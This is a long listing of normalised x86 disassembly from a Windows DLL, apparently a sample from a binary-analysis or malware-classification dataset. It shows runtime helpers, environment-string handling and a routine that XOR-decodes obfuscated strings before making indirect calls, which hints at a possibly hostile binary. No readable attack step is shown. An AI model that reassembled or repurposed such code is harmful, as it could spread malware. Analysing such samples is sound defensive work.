push ecx
lea esi [ ebp - 0x2b8 ]
mov [ ebp - 0x26 ] ax
call sub_1003a620
mov [ ebp - 0x2c0 ] eax
mov [ ebp - 0x4 ] 0x0
mov edx [ edi + 0x44 ]
push edx
lea esi [ ebp - 0x210 ]
call sub_1003a620
mov [ ebp - 0x2c8 ] eax
mov [ ebp - 0x4 ] 0x1
mov eax [ edi + 0x4 ]
push eax
lea esi [ ebp - 0x29c ]
call sub_1003a620
add esp 0xc
mov edi eax
mov [ ebp - 0x4 ] 0x2
xor ecx ecx
lea eax [ ebp - 0x24 ]
mov [ ebp - 0xdc ] cx
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0xcc ] 0x0
lea ecx [ eax + 0x2 ]
mov edi edi
mov dx [ eax ]
add eax 0x2
test dx dx
jne r-xdata
sub eax ecx
sar eax 0x1
push eax
lea edx [ ebp - 0x24 ]
push edx
lea ecx [ ebp - 0xdc ]
call sub_1005e3c0
lea eax [ ebp - 0xdc ]
push eax
mov edx r--data
lea esi [ ebp - 0x264 ]
mov [ ebp - 0x4 ] 0x3
call sub_10045750
mov ecx eax
mov eax edi
lea edi [ ebp - 0x22c ]
mov [ ebp - 0x4 ] 0x4
call sub_10021620
push eax
mov edx r--data
lea esi [ ebp - 0x1f4 ]
mov [ ebp - 0x4 ] 0x5
call sub_10045750
push eax
lea edx [ ebp - 0x74 ]
lea esi [ ebp - 0x1bc ]
mov [ ebp - 0x4 ] 0x6
call sub_10045750
mov ecx eax
mov eax [ ebp - 0x2c8 ]
lea edi [ ebp - 0x184 ]
mov [ ebp - 0x4 ] bl
call sub_10021620
push eax
mov edx r--data
lea esi [ ebp - 0x14c ]
mov [ ebp - 0x4 ] 0x8
call sub_10045750
mov ecx eax
mov eax [ ebp - 0x2c0 ]
lea edi [ ebp - 0x130 ]
mov [ ebp - 0x4 ] 0x9
call sub_10021620
push eax
lea edx [ ebp - 0x8c ]
lea esi [ ebp - 0x114 ]
mov [ ebp - 0x4 ] 0xa
call sub_10045750
push eax
lea edx [ ebp - 0x48 ]
lea esi [ ebp - 0x248 ]
mov [ ebp - 0x4 ] 0xb
call sub_10045750
mov ecx eax
mov edi [ ebp - 0x2c4 ]
lea eax [ edi + 0x60 ]
lea esi [ ebp - 0x1d8 ]
mov [ ebp - 0x4 ] 0xc
call sub_10024360
push eax
lea edx [ ebp - 0x5c ]
lea esi [ ebp - 0x280 ]
mov [ ebp - 0x4 ] 0xd
call sub_10045750
push eax
lea edx [ ebp - 0xa4 ]
lea esi [ ebp - 0x1a0 ]
mov [ ebp - 0x4 ] 0xe
call sub_10045750
mov ecx eax
lea eax [ edi + 0x7c ]
lea esi [ ebp - 0xf8 ]
mov [ ebp - 0x4 ] 0xf
call sub_10024360
push eax
lea edx [ ebp - 0xc0 ]
lea esi [ ebp - 0x168 ]
mov [ ebp - 0x4 ] 0x10
call sub_10045750
mov esi [ ebp - 0x2bc ]
push eax
lea edx [ ebp - 0x34 ]
mov [ ebp - 0x4 ] 0x11
call sub_10045750
mov edi 0x8
add esp 0x28
cmp [ ebp - 0x154 ] edi
jb r-xdata
xor esi esi
xor edx edx
mov [ ebp - 0x154 ] ebx
mov [ ebp - 0x158 ] esi
mov [ ebp - 0x168 ] dx
cmp [ ebp - 0xe4 ] edi
jb r-xdata
mov ecx [ ebp - 0x168 ]
push ecx
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ ebp - 0xe4 ] ebx
mov [ ebp - 0xe8 ] esi
mov [ ebp - 0xf8 ] cx
cmp [ ebp - 0x18c ] edi
jb r-xdata
mov eax [ ebp - 0xf8 ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov [ ebp - 0x18c ] ebx
mov [ ebp - 0x190 ] esi
mov [ ebp - 0x1a0 ] ax
cmp [ ebp - 0x26c ] edi
jb r-xdata
mov edx [ ebp - 0x1a0 ]
push edx
call sub_10065045
add esp 0x4
xor edx edx
mov [ ebp - 0x26c ] ebx
mov [ ebp - 0x270 ] esi
mov [ ebp - 0x280 ] dx
cmp [ ebp - 0x1c4 ] edi
jb r-xdata
mov ecx [ ebp - 0x280 ]
push ecx
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ ebp - 0x1c4 ] ebx
mov [ ebp - 0x1c8 ] esi
mov [ ebp - 0x1d8 ] cx
cmp [ ebp - 0x234 ] edi
jb r-xdata
mov eax [ ebp - 0x1d8 ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov [ ebp - 0x234 ] ebx
mov [ ebp - 0x238 ] esi
mov [ ebp - 0x248 ] ax
cmp [ ebp - 0x100 ] edi
jb r-xdata
mov edx [ ebp - 0x248 ]
push edx
call sub_10065045
add esp 0x4
xor edx edx
mov [ ebp - 0x100 ] ebx
mov [ ebp - 0x104 ] esi
mov [ ebp - 0x114 ] dx
cmp [ ebp - 0x11c ] edi
jb r-xdata
mov ecx [ ebp - 0x114 ]
push ecx
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ ebp - 0x11c ] ebx
mov [ ebp - 0x120 ] esi
mov [ ebp - 0x130 ] cx
cmp [ ebp - 0x138 ] edi
jb r-xdata
mov eax [ ebp - 0x130 ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov [ ebp - 0x138 ] ebx
mov [ ebp - 0x13c ] esi
mov [ ebp - 0x14c ] ax
cmp [ ebp - 0x170 ] edi
jb r-xdata
mov edx [ ebp - 0x14c ]
push edx
call sub_10065045
add esp 0x4
xor edx edx
mov [ ebp - 0x170 ] ebx
mov [ ebp - 0x174 ] esi
mov [ ebp - 0x184 ] dx
cmp [ ebp - 0x1a8 ] edi
jb r-xdata
mov ecx [ ebp - 0x184 ]
push ecx
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ ebp - 0x1a8 ] ebx
mov [ ebp - 0x1ac ] esi
mov [ ebp - 0x1bc ] cx
cmp [ ebp - 0x1e0 ] edi
jb r-xdata
mov eax [ ebp - 0x1bc ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov [ ebp - 0x1e0 ] ebx
mov [ ebp - 0x1e4 ] esi
mov [ ebp - 0x1f4 ] ax
cmp [ ebp - 0x218 ] edi
jb r-xdata
mov edx [ ebp - 0x1f4 ]
push edx
call sub_10065045
add esp 0x4
xor edx edx
mov [ ebp - 0x218 ] ebx
mov [ ebp - 0x21c ] esi
mov [ ebp - 0x22c ] dx
cmp [ ebp - 0x250 ] edi
jb r-xdata
mov ecx [ ebp - 0x22c ]
push ecx
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ ebp - 0x250 ] ebx
mov [ ebp - 0x254 ] esi
mov [ ebp - 0x264 ] cx
cmp [ ebp - 0xc8 ] edi
jb r-xdata
mov eax [ ebp - 0x264 ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov [ ebp - 0xc8 ] ebx
mov [ ebp - 0xcc ] esi
mov [ ebp - 0xdc ] ax
cmp [ ebp - 0x288 ] edi
jb r-xdata
mov edx [ ebp - 0xdc ]
push edx
call sub_10065045
add esp 0x4
xor edx edx
mov [ ebp - 0x288 ] ebx
mov [ ebp - 0x28c ] esi
mov [ ebp - 0x29c ] dx
cmp [ ebp - 0x1fc ] edi
jb r-xdata
mov ecx [ ebp - 0x29c ]
push ecx
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ ebp - 0x1fc ] ebx
mov [ ebp - 0x200 ] esi
mov [ ebp - 0x210 ] cx
cmp [ ebp - 0x2a4 ] edi
jb r-xdata
mov eax [ ebp - 0x210 ]
push eax
call sub_10065045
add esp 0x4
mov eax [ ebp - 0x2bc ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
mov edx [ ebp - 0x2b8 ]
push edx
call sub_10065045
add esp 0x4
sub_10062021
mov edi edi
push ebp
mov ebp esp
push esi
call sub_100539e5
mov eax [ eax + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_100382f1
push 0x2
push 0x100
mov [ esi + 0x4 ] eax
call sub_10025450
pop ecx
pop ecx
mov [ esi + 0x8 ] eax
test eax eax
je r-xdata
call sub_10016231
and [ esi + 0xc ] 0x0
mov [ esi + 0x8 ] eax
push 0x200
call sub_10016231
push eax
push [ esi + 0x8 ]
call sub_10078600
add esp 0xc
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_100620c0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push 0x96
push 0x64
push 0x65
push 0x63
push 0x0
mov eax esi
call sub_1006c550
push eax
call sub_1006c860
add esp 0x18
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov eax esi
call sub_1006cc00
push 0x96
push 0x64
push 0x65
push 0x63
push 0x0
mov eax esi
call sub_1006c550
push eax
call sub_1006c860
add esp 0x18
test eax eax
je r-xdata
sub_10062120
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
push ebx
push esi
push edi
cmp edx 0x7f
jg r-xdata
cmp edx 0x7ff
jg r-xdata
xor ebx ebx
mov [ ebp - 0x4 ] ebx
jmp r-xdata
cmp edx 0xffff
jg r-xdata
mov ebx 0x1
mov [ ebp - 0x4 ] 0xc0
jmp r-xdata
mov esi [ ebp + 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ esi + 0x8 ]
lea eax [ eax + ebx + 0x1 ]
mov edi ecx
cmp edi eax
jae r-xdata
mov ebx 0x3
mov [ ebp - 0x4 ] 0xf0
mov ebx 0x2
mov [ ebp - 0x4 ] 0xe0
jmp r-xdata
cmp edi ecx
je r-xdata
add edi edi
cmp edi eax
jb r-xdata
mov eax [ esi + 0x4 ]
lea ecx [ ebx + ebx * 2 ]
add ecx ecx
sar edx cl
mov ecx [ esi ]
or dl [ ebp - 0x4 ]
mov [ eax + ecx ] dl
inc [ esi + 0x4 ]
mov edi [ esi + 0x4 ]
lea eax [ ebx - 0x1 ]
test eax eax
js r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ecx
call sub_10024af0
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edx
push ecx
push eax
mov [ ebp + 0x10 ] eax
call sub_10078600
mov edx [ esi ]
mov eax [ ebp + 0x8 ]
push edx
push eax
call sub_10030ff0
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add esp 0x1c
mov [ esi ] ecx
mov [ esi + 0x8 ] edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ eax + eax * 2 ]
add ecx ecx
mov edx [ ebp + 0xc ]
mov ebx [ esi ]
sar edx cl
sub ecx 0x6
and dl 0x3f
or dl 0x80
mov [ edi + ebx ] dl
inc [ esi + 0x4 ]
dec eax
mov edi [ esi + 0x4 ]
jns r-xdata
sub_10062210
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f2b4
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
push esi
mov [ ebp - 0x4 ] 0x4
call sub_1002603e
mov eax [ esi + 0x1c ]
xor edi edi
add esp 0x4
cmp eax edi
je r-xdata
mov [ esi + 0x1c ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
push eax
call sub_10020a90
add esp 0x4
mov [ esi + 0x14 ] edi
mov eax [ esi + 0xc ]
cmp eax edi
je r-xdata
push eax
call sub_10020a90
add esp 0x4
mov [ esi + 0xc ] edi
mov eax [ esi + 0x4 ]
cmp eax edi
je r-xdata
push eax
call sub_10020a90
add esp 0x4
mov ecx esi
mov [ esi + 0x4 ] edi
mov [ ebp - 0x4 ] 0xffffffff
call sub_1002470e
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push eax
call sub_10020a90
add esp 0x4
sub_100622c0
push ebp
mov ebp esp
push 0xffffffff
push sub_10082428
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
push ecx
mov ecx [ ebp + 0xc ]
lea edx [ ebp - 0x1c ]
push edx
call sub_1005f120
add esp 0x8
mov esi eax
xor edi edi
cmp ebx esi
je r-xdata
mov esi [ ebp - 0x1c ]
cmp esi edi
je r-xdata
call sub_100538b0
mov eax [ esi ]
mov [ ebx ] eax
mov ecx [ esi + 0x4 ]
mov [ ebx + 0x4 ] ecx
mov edx [ esi + 0x8 ]
mov [ ebx + 0x8 ] edx
mov [ esi ] edi
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp - 0x18 ]
cmp esi edi
je r-xdata
push esi
call sub_10065045
add esp 0x4
call sub_10024d10
sub esi 0xffffff80
cmp esi edi
jne r-xdata
mov esi [ ebp - 0x1c ]
sub_10062366
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_10020a90
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_10062397
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
call [ GetEnvironmentStringsW@IAT ]
mov ebx eax
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebx ] si
je r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ WideCharToMultiByte@IAT ]
push esi
push esi
push esi
sub eax ebx
push esi
sar eax 0x1
inc eax
push eax
push ebx
push esi
push esi
mov [ ebp - 0xc ] eax
call edi
mov [ ebp - 0x8 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
pop esi
pop ebx
leave
retn
push ebx
call [ FreeEnvironmentStringsW@IAT ]
xor eax eax
push eax
call sub_10028397
pop ecx
mov [ ebp - 0x4 ] eax
cmp eax esi
je r-xdata
add eax 0x2
cmp [ eax ] si
jne r-xdata
push esi
push esi
push [ ebp - 0x8 ]
push eax
push [ ebp - 0xc ]
push ebx
push esi
push esi
call edi
test eax eax
jne r-xdata
push ebx
call [ FreeEnvironmentStringsW@IAT ]
mov eax [ ebp - 0x4 ]
jmp r-xdata
push [ ebp - 0x4 ]
call sub_10020a90
pop ecx
mov [ ebp - 0x4 ] esi
pop edi
sub_1006242e
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_1000363b
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1002868d
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10037533
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x18
sub_100624a0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
pop edi
pop esi
pop ebp
retn
nop
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_10065045
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_100624df
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
push edi
cmp [ rw-data ] ebx
jne r-xdata
push 0x104
mov esi rw-data
push esi
push ebx
mov [ rw-data ] bl
call [ GetModuleFileNameA@IAT ]
mov eax [ rw-data ]
mov [ rw-data ] esi
cmp eax ebx
je r-xdata
call sub_1005e29b
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x4 ] eax
cmp [ eax ] bl
jne r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
cmp ecx 0xffffffff
jae r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
push ebx
push ebx
lea edi [ ebp - 0xc ]
call sub_1007a4d2
mov eax [ ebp - 0x8 ]
add esp 0xc
cmp eax 0x3fffffff
jae r-xdata
mov edi eax
shl edi 0x2
lea eax [ edi + ecx ]
cmp eax ecx
jb r-xdata
push eax
call sub_10028397
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x8 ]
push eax
add edi esi
push edi
push esi
lea edi [ ebp - 0xc ]
call sub_1007a4d2
mov eax [ ebp - 0x8 ]
add esp 0xc
dec eax
mov [ rw-data ] eax
mov [ rw-data ] esi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_100625a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f9a3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x180
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
xor ebx ebx
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x158 ] eax
mov [ ebp - 0x140 ] ebx
mov [ ebp - 0x150 ] ebx
xor eax eax
nop
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffcb
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0x2
jb r-xdata
lea ecx [ ebp - 0x150 ]
push ecx
lea edx [ ebp - 0x1c ]
xor eax eax
push edx
mov esi edi
mov [ ebp - 0x18 ] ax
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x40 ]
mov eax 0x10e
mov [ ebp - 0x148 ] ebx
call sub_1000a6f0
lea eax [ ebp - 0x148 ]
push eax
mov ecx edx
push ecx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0xd5
call sub_1000a6f0
mov [ ebp - 0x140 ] 0x1
jmp r-xdata
lea edx [ ebp - 0xfc ]
mov eax 0x60
mov [ ebp - 0x14c ] ebx
call sub_1000a6f0
lea edx [ ebp - 0x14c ]
push edx
lea eax [ ebp - 0xfc ]
push eax
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0x99
call sub_1000a6f0
mov [ ebp - 0x140 ] 0x2
jmp r-xdata
mov edx [ ebp - 0x150 ]
mov esi [ SysFreeString@IAT ]
push edx
call esi
mov eax [ ebp - 0x148 ]
push eax
call esi
mov ecx [ ebp - 0x14c ]
push ecx
call esi
mov edx [ ebp - 0x144 ]
push edx
call esi
mov eax [ ebp - 0x184 ]
push eax
call esi
mov ecx [ ebp - 0x188 ]
push ecx
call esi
mov eax [ ebp - 0x140 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0xc
lea edx [ ebp - 0x6c ]
mov eax 0x120
mov [ ebp - 0x144 ] ebx
call sub_1000a6f0
lea ecx [ ebp - 0x144 ]
push ecx
push edx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0x57
call sub_1000a6f0
lea edx [ ebp - 0x4c ]
mov eax 0x28
mov [ ebp - 0x184 ] ebx
call sub_1000a6f0
lea eax [ ebp - 0x184 ]
push eax
mov ecx edx
push ecx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0xe8
call sub_1000a6f0
mov [ ebp - 0x140 ] 0x4
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0xa7
mov [ ebp - 0x188 ] ebx
call sub_1000a6f0
lea edx [ ebp - 0x188 ]
push edx
lea eax [ ebp - 0x28 ]
push eax
call sub_100145e0
add esp 0x8
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0xd0
call sub_1000a6f0
mov [ ebp - 0x140 ] 0x5
jmp r-xdata
mov eax [ ebp - 0x184 ]
mov [ ebp - 0x154 ] ebx
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xcc ]
mov eax 0x3c
call sub_1000a6f0
cmp [ ebp + 0x10 ] ebx
je r-xdata
push eax
call sub_1000eb90
add esp 0x4
mov [ ebp - 0x154 ] eax
xor eax eax
lea esi [ ebp - 0x180 ]
call sub_10027500
xor eax eax
lea esi [ ebp - 0x178 ]
mov [ ebp - 0x4 ] ebx
call sub_10027500
xor eax eax
lea esi [ ebp - 0x160 ]
call sub_10027500
xor eax eax
lea esi [ ebp - 0x170 ]
call sub_10027500
xor eax eax
lea esi [ ebp - 0x168 ]
call sub_10027500
mov [ ebp - 0x4 ] 0x4
mov esi [ ebp - 0x154 ]
cmp esi 0x6
ja r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x70
call sub_1000a6f0
mov [ ebp - 0x140 ] 0xb
jmp [ esi * 4 + jump_table_10062d18 ]
lea edx [ ebp - 0x9c ]
mov eax 0x9b
call sub_1000a6f0
mov [ ebp - 0x140 ] 0x6
jmp r-xdata
lea edx [ ebp - 0x34 ]
mov eax 0x125
call sub_1000a6f0
mov ecx [ edi ]
mov ecx [ ecx + 0x94 ]
lea edx [ ebp - 0x13c ]
push edx
lea eax [ ebp - 0x34 ]
push eax
push edi
mov [ ebp - 0x13c ] ebx
call ecx
cmp [ ebp - 0x13c ] ebx
je r-xdata
lea edx [ ebp - 0x5c ]
mov eax 0x54
call sub_1000a6f0
mov ecx [ edi ]
mov ecx [ ecx + 0x94 ]
lea edx [ ebp - 0x13c ]
push edx
lea eax [ ebp - 0x5c ]
push eax
push edi
mov [ ebp - 0x13c ] ebx
call ecx
cmp [ ebp - 0x13c ] ebx
je r-xdata
lea edx [ ebp - 0xe8 ]
mov eax 0xdc
call sub_1000a6f0
mov ecx [ edi ]
mov ecx [ ecx + 0x94 ]
lea edx [ ebp - 0x13c ]
push edx
lea eax [ ebp - 0xe8 ]
push eax
push edi
mov [ ebp - 0x13c ] ebx
call ecx
cmp [ ebp - 0x13c ] ebx
je r-xdata
lea edx [ ebp - 0x114 ]
mov eax 0xeb
call sub_1000a6f0
mov eax [ edi ]
mov eax [ eax + 0x94 ]
lea ecx [ ebp - 0x13c ]
push ecx
push edx
push edi
mov [ ebp - 0x13c ] ebx
call eax
cmp [ ebp - 0x13c ] ebx
je r-xdata
lea edx [ ebp - 0x138 ]
mov eax 0x12
call sub_1000a6f0
mov edx [ edi ]
mov edx [ edx + 0x94 ]
lea eax [ ebp - 0x13c ]
push eax
lea ecx [ ebp - 0x138 ]
push ecx
push edi
mov [ ebp - 0x13c ] ebx
call edx
cmp [ ebp - 0x13c ] ebx
je r-xdata
push 0x40
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp [ ebp - 0x180 ] ebx
je r-xdata
lea esi [ ebp - 0x168 ]
mov [ ebp - 0x4 ] 0x3
call sub_10010040
lea esi [ ebp - 0x170 ]
mov [ ebp - 0x4 ] 0x2
call sub_10010040
lea esi [ ebp - 0x160 ]
mov [ ebp - 0x4 ] 0x1
call sub_10010040
lea edi [ ebp - 0x178 ]
call sub_10014890
lea edi [ ebp - 0x180 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10065690
lea edx [ ebp - 0xc4 ]
mov eax 0xb
call sub_1000a6f0
mov [ ebp - 0x140 ] 0x7
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0x180 ]
push edx
push eax
lea ecx [ ebp - 0x13c ]
call sub_1002a2b0
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xc4 ]
mov eax 0xfd
call sub_1000a6f0
mov [ ebp - 0x140 ] 0x8
jmp r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0x13c ]
push edx
push eax
lea ebx [ ebp - 0x178 ]
call sub_10017480
test eax eax
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0x49
call sub_1000a6f0
mov [ ebp - 0x140 ] 0x9
jmp r-xdata
mov edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x13c ]
lea edi [ ebp - 0x160 ]
call sub_1002e220
cmp eax ebx
je r-xdata
lea edx [ ebp - 0xd4 ]
mov eax 0xb8
call sub_1000a6f0
mov [ ebp - 0x140 ] 0xa
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x13c ]
lea edi [ ebp - 0x170 ]
call sub_1005b520
cmp eax ebx
je r-xdata
mov [ ebp - 0x140 ] 0xa
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x13c ]
lea edi [ ebp - 0x168 ]
call sub_100575c0
cmp eax ebx
je r-xdata
cmp [ ebp - 0x178 ] ebx
je r-xdata
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x4 ] 0x5
cmp eax ebx
je r-xdata
mov esi [ ebp - 0x154 ]
xor ebx ebx
cmp [ ebp - 0x160 ] ebx
je r-xdata
mov edi eax
cmp edi ebx
je r-xdata
mov edx [ ebp - 0x158 ]
xor eax eax
mov [ edx ] eax
jmp r-xdata
mov edx [ ebp - 0x144 ]
lea ecx [ ebp - 0x180 ]
push ecx
mov ecx [ ebp - 0x14c ]
push esi
push edx
mov edx [ ebp - 0x148 ]
push ecx
mov ecx [ ebp - 0x150 ]
push edx
push ecx
push eax
call sub_1000c630
mov edx [ ebp - 0x158 ]
mov [ edx ] eax
jmp r-xdata
cmp [ ebp - 0x170 ] ebx
je r-xdata
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x4 ] 0x6
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x144 ]
mov edx [ ebp - 0x14c ]
lea eax [ ebp - 0x178 ]
push eax
mov eax [ ebp - 0x148 ]
push ecx
mov ecx [ ebp - 0x150 ]
push edx
push eax
push ecx
mov eax esi
call sub_10015890
mov edx [ ebp - 0x158 ]
mov [ edx ] eax
jmp r-xdata
cmp [ ebp - 0x168 ] ebx
je r-xdata
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x4 ] 0x7
cmp eax ebx
je r-xdata
mov edx [ ebp - 0x144 ]
lea ecx [ ebp - 0x160 ]
push ecx
mov ecx [ ebp - 0x14c ]
push esi
push edx
mov edx [ ebp - 0x148 ]
push ecx
mov ecx [ ebp - 0x150 ]
push edx
push ecx
push eax
call sub_10035ff0
mov edx [ ebp - 0x158 ]
mov [ edx ] eax
jmp r-xdata
mov ecx eax
cmp ecx ebx
je r-xdata
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x4 ] 0x8
cmp eax ebx
je r-xdata
mov edx [ ebp - 0x144 ]
lea ecx [ ebp - 0x170 ]
push ecx
mov ecx [ ebp - 0x14c ]
push esi
push edx
mov edx [ ebp - 0x148 ]
push ecx
mov ecx [ ebp - 0x150 ]
push edx
push ecx
push eax
call sub_1004d430
mov edx [ ebp - 0x158 ]
mov [ edx ] eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x188 ]
mov edx [ ebp - 0x144 ]
push eax
mov eax [ ebp - 0x14c ]
push edx
mov edx [ ebp - 0x148 ]
push eax
mov eax [ ebp - 0x150 ]
push edx
push eax
mov eax esi
call sub_100516a0
jmp r-xdata
mov edx [ ebp - 0x144 ]
lea ecx [ ebp - 0x168 ]
push ecx
mov ecx [ ebp - 0x14c ]
push esi
push edx
mov edx [ ebp - 0x148 ]
push ecx
mov ecx [ ebp - 0x150 ]
push edx
push ecx
push eax
call sub_1000e030
mov edx [ ebp - 0x158 ]
mov [ edx ] eax
jmp r-xdata
mov ecx [ ebp - 0x158 ]
mov [ ecx ] eax
lea edx [ ebp - 0xa8 ]
mov eax 0x33
call sub_1000a6f0
jmp r-xdata
sub_10062d40
push ebp
mov ebp esp
mov eax [ edi + 0x10 ]
push ebx
push esi
cmp eax 0x1
jb r-xdata
pop esi
or eax 0xffffffff
pop ebx
pop ebp
retn 0x4
dec eax
cmp eax 0xffffffff
jbe r-xdata
mov ecx eax
or ecx 0xffffffff
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov ecx edi
call sub_1004c0c0
cmp esi eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push 0x1
push ecx
push esi
call sub_10068a30
add esp 0xc
test eax eax
je r-xdata
lea esi [ eax + ecx ]
mov eax [ ebp + 0x8 ]
mov bl [ eax ]
mov edi edi
dec esi
jmp r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp [ esi ] bl
jne r-xdata
mov eax esi
mov ecx edi
pop esi
sub eax ecx
pop ebx
pop ebp
